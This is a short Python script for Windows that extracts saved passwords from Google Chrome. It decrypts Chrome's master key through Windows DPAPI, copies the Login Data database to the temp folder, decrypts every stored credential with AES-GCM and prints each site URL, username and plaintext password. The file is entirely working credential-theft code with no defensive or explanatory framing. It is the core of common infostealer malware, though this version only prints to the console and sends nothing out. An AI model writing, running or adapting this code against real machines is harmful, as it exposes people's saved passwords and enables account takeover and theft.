import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil


TEMP = os.getenv("TEMP")


def get_master_key():
    with open(os.environ["USERPROFILE"] + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", "r") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key


def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e:
        return str(e)


def main():
    master_key = get_master_key()
    login_db = os.environ["USERPROFILE"] + "\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data"
    login_db_copy = TEMP + "\\login.db"
    shutil.copy2(login_db, login_db_copy)
    conn = sqlite3.connect(login_db_copy)
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")

        log = ""
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            log += f"URL: {url}\nUSR: {username}\nPDW: {decrypted_password}\n\n"

        print(log)

    except sqlite3.Error:
        pass

    cursor.close()
    conn.close()
    os.remove(login_db_copy)


if __name__ == '__main__':
    main()
